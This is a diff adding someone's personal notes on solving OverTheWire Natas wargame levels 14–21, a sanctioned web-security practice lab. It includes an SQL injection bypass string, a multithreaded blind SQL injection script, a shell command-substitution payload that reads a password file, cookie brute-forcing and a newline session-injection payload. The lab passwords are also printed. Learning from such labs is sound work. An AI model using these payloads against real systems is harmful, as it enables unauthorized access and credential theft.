@@ -223,3 +223,209 @@ output: GIF89a; A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
 ###### natas14
 natas14
 A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
+(28.6.26 14:09)
+I'll try to do at least 2 levels today before imma head home.
+
+It was easy. like its 14:10 now. It was a login extremely valuable to SQL injection.
+Hit him with that `" or ""="`
+no sanitizations, no escaping, nothing.
+Successful login! The password for natas15 is GB6USCJYJjwLyYhZUNkE1NwDueiTow6g
+
+###### natas15
+natas15
+GB6USCJYJjwLyYhZUNkE1NwDueiTow6g
+
+I remember this level. Basically I can ask if natas15 exists and his password starts with A. It will go through a-z A-Z 0-9. Lets say it starts with z
+After i get a hit, I will rerun this script with z in the beginning. Passwords are 32 chars long.
+I gave chatgpt the script i wrote and it gave me a much faster version:
+Python script:
+
+`import requests`
+
+`from concurrent.futures import ThreadPoolExecutor, as_completed`
+
+  
+
+`URL = "http://natas15.natas.labs.overthewire.org/index.php"`
+
+`AUTH = ("natas15", "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g")`
+
+  
+
+`session = requests.Session()`
+
+`session.auth = AUTH`
+
+  
+  
+
+`def get_char(position):`
+
+    `low = 32`
+
+    `high = 126`
+
+  
+
+    `while low <= high:`
+
+        `mid = (low + high) // 2`
+
+  
+
+        `payload = f'natas16" AND ASCII(SUBSTRING(password,{position},1)) > {mid} -- '`
+
+  
+
+        `response = session.post(`
+
+            `URL,`
+
+            `data={"username": payload},`
+
+            `timeout=10`
+
+        `)`
+
+  
+
+        `if "This user exists" in response.text:`
+
+            `low = mid + 1`
+
+        `else:`
+
+            `high = mid - 1`
+
+  
+
+    `return position, chr(low)`
+
+  
+  
+
+`password = ["?"] * 32`
+
+  
+
+`with ThreadPoolExecutor(max_workers=16) as executor:`
+
+    `futures = [executor.submit(get_char, i) for i in range(1, 33)]`
+
+  
+
+    `for future in as_completed(futures):`
+
+        `pos, ch = future.result()`
+
+        `password[pos - 1] = ch`
+
+        `print(f"[{pos:02}] -> {ch} | Current: {''.join(password)}")`
+
+  
+
+`print("\nPassword:", "".join(password))`
+
+###### natas16
+Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb
+Basically the same script, but we are passing a grep command inside the $key.
+$(grep ^{attempt} /etc/natas_webpass/natas17)
+if valid then it will return no results. Script is saved in my natas folder.
+KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx
+
+###### natas17
+natas17
+KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx
+Its a check user code but it doesnt print anything. So i am thinking about sleep based oracle.
+Of course, I remember it from the last time I did this lol. Call it pattern recognition.
+Ill do it tomorrow. I will go home soon!
+30.6.26 8:41
+I tried many approaches, not enough. I ended up using the old script and SQL phrasing. My idea was correct, it was just a matter of syntex.
+I don't call it cheating, but ChatGPT did the syntex not gonna lie.
+Still, my idea was correct.
+fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op
+
+###### natas18
+natas18
+fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op
+
+There is a login page. I need to get into an admin session to get the password for natas19
+I want to try to bruteforce the cookie. Between 0 - 640.
+Shouldn't take long.
+Yep. Did it with burp suite. Cookie number 119.
+You are an admin. The credentials for the next level are:
+Username: natas19
+Password: qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT
+
+###### natas19
+natas19
+qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT
+
+This time it seems like the cookie is encoded.
+
+I have a cookie of example:example
+3133352d6578616d706c65
+
+the cookie decoded is: number - username
+According to isValodID function.
+Isn't it great that they left the code for encryption and decryption?
+This is my cookie decoded:
+`$h = "3133352d6578616d706c65";`
+
+`function myhex2bin($h) {`
+  `if (!is_string($h)) return null;`
+  `$r='';`
+  `for ($a=0; $a<strlen($h); $a+=2) {`
+    `$r .= chr(hexdec($h[$a].$h[$a+1]));`
+  `}`
+  `return $r;`
+`}`
+
+`echo myhex2bin($h);`
+`?>`
+all we need is to create a cookie with admin as the name!
+69 - admin. encoded to hex: 36392d61646d696e
+it doesnt work. maybe i need to use a valid id?
+doesnt work either.
+Lets bruteforce with the known encryption
+0-640-admin.
+
+[+] Found valid ID: 281
+[+] Payload: 3238312d61646d696e
+
+You are an admin. The credentials for the next level are:  
+
+Username: natas20
+Password: slOKYGsjlJhaqKliGvrgWAzln0JyrWao
+
+###### natas20
+natas20
+slOKYGsjlJhaqKliGvrgWAzln0JyrWao
+
+So basically the same thing.
+The session is being saved via session_save_path() which in default is /tmp/
+
+We run a brute-force check to http://natas20.natas.labs.overthewire.org/tmp/mysess_{i}-admin
+with i being a-z, A-Z, 0-9
+
+Well, I wasnt even close.
+
+payload: name=admin%0aadmin+1
+this is supposed to get the data to
+name = admin
+admin 1
+as the session name.
+basically newline injection and session something something.
+meh.
+
+Username: natas21
+Password: 7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU
+
+###### natas21
+natas21
+7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU
+
+There are two pages. One is a regular one which will change once i enter an admin session, the other one I can just change the colors of the page. My guess is session injection or newline injection from the fields in the other page.
+
+
+
